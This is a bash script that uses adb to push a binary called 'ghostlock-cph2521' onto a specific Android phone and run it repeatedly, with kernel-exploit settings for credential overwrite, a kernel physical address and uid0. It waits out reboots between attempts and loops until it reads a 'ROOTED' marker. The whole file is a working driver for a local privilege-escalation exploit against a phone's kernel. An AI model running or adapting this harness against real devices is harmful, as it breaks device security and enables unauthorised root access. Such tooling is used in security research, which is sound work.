#!/bin/bash
# DIRECT punch flip loop: fire when settled, read result, re-roll. Stop on ROOTED.
ADB=./adb_local.exe
WIFI=192.168.1.2:5555
cd "$(dirname "$0")"
MAX=${1:-8}
OUT=fliplog_$(date +%H%M).txt
con() { MSYS_NO_PATHCONV=1 "$ADB" connect $WIFI >/dev/null 2>&1; MSYS_NO_PATHCONV=1 "$ADB" devices 2>/dev/null | grep -q "$WIFI.*device"; }
for n in $(seq 1 $MAX); do
  # wait for device back (reboots)
  for w in $(seq 1 60); do con && break; sleep 20; done
  con || { echo "roll$n: device gone" >> $OUT; break; }
  UP=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  if [ -n "$UP" ] && [ "$UP" -lt 600 ] 2>/dev/null; then
    S=$((620 - UP)); echo "roll$n: uptime=$UP wait ${S}s" >> $OUT; sleep $S
  fi
  B="fv$(date +%s | tail -c 5)"; L="fl$(date +%s | tail -c 6)"
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI push ghostlock-cph2521 /data/local/tmp/$B >/dev/null 2>&1
  MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "chmod 755 /data/local/tmp/$B; rm -f /data/local/tmp/ROOTED /data/local/tmp/uid0_id.txt /data/local/tmp/ROOTED_ID.txt /data/local/tmp/child_uid.txt /data/local/tmp/uid0_go; cd /data/local/tmp; nohup sh -c 'timeout 240 env MODE4_ONLY=1 MODE4_SLIDE_CRED=1 MODE4_DUALWRITE=1 MODE4_CRED_INITTASK=1 UID0_DIRECT=1 UID0_PREFER_CHILD=1 UID0_QUIET_CHILD=1 UID0_PUR_SPIN=1 UID0_SLOT=0x778 KPHYS=0xa8000000 CORE_SEL=7 GHOSTLOCK_LIVE_SYNC=/sdcard/ghostlock/aarif/live_sync.log GHOSTLOCK_STAGE=/sdcard/ghostlock/aarif/stage.txt GHOSTLOCK_PROOF=/sdcard/ghostlock/aarif/proof.log /data/local/tmp/$B' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
  UP2=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  echo "roll$n: FIRED $L up=$UP2" >> $OUT
  sleep 120
  # read result (reconnect if rebooted)
  con || { sleep 60; con || { echo "roll$n: device dropped mid-fire" >> $OUT; continue; }; }
  R=$(MSYS_NO_PATHCONV=1 "$ADB" -s $WIFI shell "grep -a 'WIN\|ROOTED' /data/local/tmp/$L.txt 2>/dev/null | tail -4; cat /data/local/tmp/ROOTED_ID /data/local/tmp/ROOTED 2>/dev/null; cut -d. -f1 /proc/uptime" 2>/dev/null | tr -d '\r')
  echo "roll$n RESULT: $R" >> $OUT
  echo "$R" | grep -q "ROOTED_ID" && { echo "roll$n: *** ROOTED ***" >> $OUT; break; }
  # Space same-boot punches: back-to-back fires leave ghost residue (roll2
  # KP after roll1's survived miss). 10 min between rolls regardless.
  sleep 480
done
echo "LOOP DONE $(date)" >> $OUT
